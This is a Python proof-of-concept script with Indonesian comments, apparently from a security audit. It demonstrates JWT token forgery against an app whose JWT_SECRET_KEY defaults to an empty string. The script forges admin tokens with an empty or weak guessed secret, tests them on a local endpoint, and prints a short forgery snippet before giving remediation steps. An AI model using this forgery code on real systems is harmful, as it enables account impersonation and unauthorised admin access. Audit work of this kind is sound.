#!/usr/bin/env python3
"""
PoC: MEDIUM-011 — JWT Token Forgery via Empty Secret Key
=========================================================
Demonstrasi bahwa jika JWT_SECRET_KEY tidak di-set (default=""),
attacker bisa MEMALSUKAN token yang valid untuk akun siapapun
TANPA mengetahui password.

TUJUAN DEMO:
  Membuktikan bahwa token palsu dengan email admin diterima server
  jika JWT_SECRET_KEY menggunakan default kosong "".

CARA MENJALANKAN:
  pip install PyJWT requests
  python MEDIUM-011-jwt-token-forgery.py

SAFETY: Hanya membuat token lokal & menguji endpoint read-only.
        Tidak mengubah data apapun. JANGAN jalankan di production.

CATATAN: Finding ini HANYA aktif jika JWT_SECRET_KEY belum di-set
         di environment variables production. Jika sudah di-set
         dengan nilai aman, token palsu akan ditolak.
"""

import sys
from datetime import datetime, timezone, timedelta

try:
    import jwt as pyjwt
except ImportError:
    print("Install dulu: pip install PyJWT")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("Install dulu: pip install requests")
    sys.exit(1)

# ──────────────────────────────────────────────
# KONFIGURASI
# ──────────────────────────────────────────────
API_BASE = "http://localhost:8000/api/v1"

# Target email yang akan di-impersonate (gunakan email test di DEV)
TARGET_EMAIL = "admin@kpc.co.id"  # Ganti dengan email yang ada di DEV

# Secret yang dicoba — sesuai dengan finding (default = "")
CANDIDATE_SECRETS = [
    "",           # Default kosong — ini yang paling berbahaya
    "secret",     # Secret lemah umum
    "changeme",   # Secret placeholder
    "jwt_secret", # Nama variabel sebagai value
]

ALGORITHM = "HS256"
READ_ENDPOINT = f"{API_BASE}/auth/me"


def separator(title: str):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")


def forge_token(email: str, secret: str, hours_valid: int = 24) -> str:
    """Buat token JWT palsu dengan secret yang ditebak."""
    payload = {
        "sub": email,
        "exp": datetime.now(timezone.utc) + timedelta(hours=hours_valid),
        "iat": datetime.now(timezone.utc),
        "type": "access",
    }
    return pyjwt.encode(payload, secret, algorithm=ALGORITHM)


def test_forged_token(token: str, secret_used: str) -> bool:
    """Test apakah token palsu diterima oleh server."""
    try:
        resp = requests.get(
            READ_ENDPOINT,
            headers={"Authorization": f"Bearer {token}"},
            timeout=5,
        )

        if resp.status_code == 200:
            print(f"\n  \033[91m╔══════════════════════════════════════╗\033[0m")
            print(f"  \033[91m║  TOKEN PALSU DITERIMA!               ║\033[0m")
            print(f"  \033[91m╚══════════════════════════════════════╝\033[0m")
            print(f"  Secret yang berhasil: '{secret_used}'")
            user_data = resp.json()
            print(f"  Akun yang berhasil di-impersonate: {user_data.get('email')}")
            print(f"  Full name: {user_data.get('full_name', 'N/A')}")
            return True
        elif resp.status_code == 401:
            print(f"  Secret '{secret_used}' → HTTP 401 (Token ditolak)")
            return False
        else:
            print(f"  Secret '{secret_used}' → HTTP {resp.status_code}")
            return False

    except requests.exceptions.ConnectionError:
        print(f"  Tidak bisa terhubung ke {API_BASE}")
        return False


def decode_and_inspect(token: str, secret: str):
    """Inspect isi token untuk demo."""
    try:
        payload = pyjwt.decode(token, secret, algorithms=[ALGORITHM])
        print(f"\n  Token payload (isi JWT yang dipalsukan):")
        for key, val in payload.items():
            if key == "exp":
                print(f"    {key}: {datetime.fromtimestamp(val).isoformat()} (expires)")
            elif key == "iat":
                print(f"    {key}: {datetime.fromtimestamp(val).isoformat()} (issued at)")
            else:
                print(f"    {key}: {val}")
    except Exception as e:
        print(f"  Decode error: {e}")


def main():
    separator("MEDIUM-011 PoC — JWT Token Forgery (Empty Secret Key)")
    print(
        f"""
  SKENARIO:
  Attacker mengetahui bahwa JWT_SECRET_KEY tidak di-set di server.
  Mereka memalsukan token untuk akun '{TARGET_EMAIL}' menggunakan
  secret kosong "" (default value dari aplikasi).

  YANG AKAN DIBUKTIKAN:
  Jika JWT_SECRET_KEY = "", token palsu diterima sebagai valid.

  DAMPAK BISNIS:
  • Akses admin ke seluruh data aplikasi TANPA password
  • Tidak meninggalkan trace di log auth (tidak ada login gagal)
  • Attacker bisa impersonate akun siapapun termasuk admin
"""
    )

    # ──────────────────────────────────────
    # STEP 1: Buat token palsu
    # ──────────────────────────────────────
    separator("STEP 1 — Membuat Token Palsu")
    print(f"  Target email   : {TARGET_EMAIL}")
    print(f"  Algorithm      : {ALGORITHM}")
    print(f"  Durasi valid   : 24 jam (sama dengan config aplikasi)")

    forged_token = forge_token(TARGET_EMAIL, "")
    print(f"\n  Token palsu berhasil dibuat:")
    print(f"  {forged_token[:60]}...")

    print("\n  Inspect isi token:")
    decode_and_inspect(forged_token, "")

    # ──────────────────────────────────────
    # STEP 2: Test ke server
    # ──────────────────────────────────────
    separator("STEP 2 — Menguji Token Palsu ke Server DEV")
    print("  Mencoba setiap kandidat secret...")
    print()

    any_success = False
    for secret in CANDIDATE_SECRETS:
        token = forge_token(TARGET_EMAIL, secret)
        label = f'"{secret}"' if secret else '""  (string kosong — default!)'
        print(f"  Testing secret: {label}")
        success = test_forged_token(token, secret)
        if success:
            any_success = True
            break  # Cukup tunjukkan yang pertama

    # ──────────────────────────────────────
    # STEP 3: Ringkasan
    # ──────────────────────────────────────
    separator("RINGKASAN DEMO — MEDIUM-011")

    if any_success:
        print(
            """
  \033[91mHASIL: VULNERABLE\033[0m
  JWT_SECRET_KEY menggunakan default kosong "" — token dapat dipalsukan.

  CHAIN OF RISK (kombinasi dengan finding lain):
  MEDIUM-011 + HIGH-002 + HIGH-003:
  → Attacker forge token untuk admin
  → Token valid 24 jam, tidak bisa direvoke
  → Akses penuh ke invoice, kontrak, data finansial

  REKOMENDASI:
  1. Set JWT_SECRET_KEY dengan nilai acak minimal 64 karakter
  2. Tambahkan startup validation: raise error jika secret kosong
  3. Rotasi semua token yang ada setelah perbaikan
"""
        )
    else:
        print(
            """
  \033[92mHASIL: Secret sudah dikonfigurasi dengan benar\033[0m
  Token palsu ditolak — JWT_SECRET_KEY sudah di-set ke nilai yang aman.

  NAMUN: Finding ini tetap valid karena:
  • Default value masih "" di code (berbahaya jika env var terhapus)
  • Tidak ada startup validation yang mencegah startup dengan secret kosong
  • Risk: deploy tanpa .env → aplikasi jalan dengan secret ""
"""
        )

    # ──────────────────────────────────────
    # BONUS: Tunjukkan betapa mudahnya
    # ──────────────────────────────────────
    separator("BONUS — Seberapa Mudah Token Forgery?")
    print(
        """
  Hanya 5 baris Python untuk memalsukan token admin:

  import jwt
  from datetime import datetime, timezone, timedelta

  fake = jwt.encode(
      {"sub": "admin@kpc.co.id",
       "exp": datetime.now(timezone.utc) + timedelta(hours=24)},
      "",            # secret kosong
      algorithm="HS256"
  )
  # fake sekarang adalah token valid selama 24 jam untuk admin@kpc.co.id
  # Tidak perlu tahu password. Tidak ada trace di log.
"""
    )


if __name__ == "__main__":
    main()
